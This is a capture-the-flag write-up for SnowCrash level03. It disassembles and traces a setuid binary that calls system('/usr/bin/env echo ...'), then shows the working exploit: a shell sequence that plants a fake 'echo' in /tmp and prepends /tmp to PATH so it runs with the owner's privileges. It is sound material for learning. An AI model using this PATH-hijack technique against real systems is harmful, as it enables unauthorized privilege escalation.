# LEVEL 03

    ls  
Outputs an executable called level03.
When we run the executable level03 in the machine (it doesn't accept any arguments), it only outputs "exploit me".

 We can use GDB to try to decompile the executable level03 by doing:
```
disassemble main
```
We get the following output:

    (gdb) disassemble main
    Dump of assembler code for function main:
       0x080484a4 <+0>:     push   %ebp
       0x080484a5 <+1>:     mov    %esp,%ebp
       0x080484a7 <+3>:     and    $0xfffffff0,%esp
       0x080484aa <+6>:     sub    $0x20,%esp
       0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
       0x080484b2 <+14>:    mov    %eax,0x18(%esp)
       0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
       0x080484bb <+23>:    mov    %eax,0x1c(%esp)
       0x080484bf <+27>:    mov    0x18(%esp),%eax
       0x080484c3 <+31>:    mov    %eax,0x8(%esp)
       0x080484c7 <+35>:    mov    0x18(%esp),%eax
       0x080484cb <+39>:    mov    %eax,0x4(%esp)
       0x080484cf <+43>:    mov    0x18(%esp),%eax
       0x080484d3 <+47>:    mov    %eax,(%esp)
       0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
       0x080484db <+55>:    mov    0x1c(%esp),%eax
       0x080484df <+59>:    mov    %eax,0x8(%esp)
       0x080484e3 <+63>:    mov    0x1c(%esp),%eax
       0x080484e7 <+67>:    mov    %eax,0x4(%esp)
       0x080484eb <+71>:    mov    0x1c(%esp),%eax
       0x080484ef <+75>:    mov    %eax,(%esp)
    ---Type <return> to continue, or q <return> to quit---
       0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
       0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
       0x080484fe <+90>:    call   0x80483b0 <system@plt>
       0x08048503 <+95>:    leave  
       0x08048504 <+96>:    ret    
    End of assembler dump.


Using an online decompiler like [Dogbolt](https://dogbolt.org/) and pasting our result into the Ghidra we get the following result :

    int main(int argc,char **argv,char **envp){
    
    __gid_t __rgid;
    __uid_t __ruid;
    
    int iVar1;
    gid_t gid;
    uid_t uid;
    __rgid = getegid(); // returns the effective group ID of the calling process
    __ruid = geteuid(); // returns the effective user ID of the calling process.
    
    setresgid(__rgid,__rgid,__rgid);
    setresuid(__ruid,__ruid,__ruid); // sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
    iVar1 = system("/usr/bin/env echo Exploit me"); //calls the echo builtin located in usr/bin/env
    return iVar1;
    }
      


That result is confirmed with the use of commands such as :
ltrace <file>

    level03@SnowCrash:~$ ltrace ./level03
    __libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
    getegid()                                              = 2003
    geteuid()                                              = 2003
    setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)    = 0
    setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)    = 0
    system("/usr/bin/env echo Exploit me"Exploit me
     <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                 = 0
    +++ exited (status 0) +++
 
 ## Security weaknesses
 From that we understand that this program has 2 security weaknesses that we can manipulate :
 
 1. the use of getegid(), geteuid(), setresgid() and setresuid()
 Used before a call to system(), these commands temporarily execute with the permissions of the program level03.
 
      ```-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03```
      > RWS ; read, write and setuid permission for the owner (flag03)
      > RS : read permission for group level03, setgid for level03
      > RX: read and execution rights for others
      Special permissions on this file will allow the executable to run with the permission of the file owner (flag03)

2. Environment manipulation
By manipulating the environment or the executable pointed to by /usr/bin/env (in this case, echo), you can alter the behavior of what echo actually does.
If you replace /usr/bin/env echo with a malicious version of echo that links to another executable, you can execute malicious_program indirectly.

	> Switch the echo builtin with ./getflag that we need to execute



    ```level03@SnowCrash:~$ cp /bin/getflag /tmp/
    level03@SnowCrash:~$ cd /tmp
    level03@SnowCrash:/tmp$ mv getflag echo
    level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
    level03@SnowCrash:/tmp$ cd ~
    level03@SnowCrash:~$ ./level03```